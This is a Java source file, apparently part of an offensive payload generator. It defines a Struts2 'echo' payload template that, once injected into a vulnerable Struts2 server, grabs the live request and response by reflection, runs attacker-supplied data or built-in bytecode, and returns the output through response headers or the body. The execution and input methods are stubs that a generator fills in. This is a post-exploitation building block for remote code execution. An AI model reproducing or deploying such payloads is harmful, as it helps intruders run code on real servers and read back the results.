package com.reajason.javaweb.probe.payload.response;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author ReaJason
 * @since 2025/12/8
 */
public class Struts2Writer {
    private static boolean ok = false;

    /**
     * 固定数据（内置字节码等不依赖请求参数的内容）预执行标记与结果：
     * 先执行再找回显位置，回显定位失败也不影响字节码已经执行
     */
    private boolean preRan = false;
    private String preResult = null;

    public Struts2Writer() {
        if (ok) {
            return;
        }
        try {
            runEarly();
            Class<?> clazz = Thread.currentThread().getContextClassLoader().loadClass("com.opensymphony.xwork2.ActionContext");
            Object context = clazz.getMethod("getContext").invoke(null);
            Method getMethod = clazz.getMethod("get", String.class);
            Object request = getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletRequest");
            Object response = getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletResponse");
            String data = getDataFromReq(request);
            if (data != null && !data.isEmpty()) {
                String result = preRan ? preResult : execute(data);
                if (result != null) {
                    if (!writeHeader(response, result)) {
                        try {
                            OutputStream outputStream = (OutputStream) invokeMethod(response, "getOutputStream", null, null);
                            outputStream.write(result.getBytes());
                            outputStream.flush();
                            outputStream.close();
                        } catch (Throwable e) {
                            PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
                            writer.write(result);
                            writer.flush();
                            writer.close();
                        }
                    }
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        } finally {
            ok = true;
        }
    }

    private String getDataFromReq(Object request) throws Exception {
        return null;
    }

    private String run(String data) throws Exception {
        return null;
    }

    /**
     * 固定数据模式（内置字节码等）下 getDataFromReq 已被生成器替换为固定值，不依赖请求对象：
     * 先执行再找回显位置，防止回显定位失败导致字节码根本没执行；
     * 参数触发模式这里拿到 null 或抛异常，落回原有的「先定位再执行」流程
     */
    private void runEarly() {
        String data;
        try {
            data = getDataFromReq(null);
        } catch (Throwable ignored) {
            return;
        }
        if (data == null || data.isEmpty()) {
            return;
        }
        preRan = true;
        preResult = execute(data);
    }

    private String execute(String data) {
        try {
            return run(data);
        } catch (Throwable e) {
            return getErrorMessage(e);
        }
    }

    /**
     * ResponseHeader 通道：由生成器注入，返回 true 表示结果已写进响应头，跳过响应体。
     */
    private boolean writeHeader(Object response, String result) {
        return false;
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(obj.getClass() + " Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
